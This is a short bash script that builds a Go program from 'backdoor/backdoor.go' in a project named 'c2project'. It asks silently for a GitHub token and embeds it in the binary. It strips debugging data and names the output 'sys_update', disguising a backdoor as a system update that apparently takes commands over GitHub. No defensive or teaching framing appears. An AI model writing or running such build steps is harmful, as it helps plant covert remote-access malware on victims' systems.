#!/bin/bash
read -sp "Enter github pat: " GITHUB_PAT

CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
    -ldflags="-s -w -X 'c2project/github.GithubToken=$GITHUB_PAT'" \
    -o sys_update \
    backdoor/backdoor.go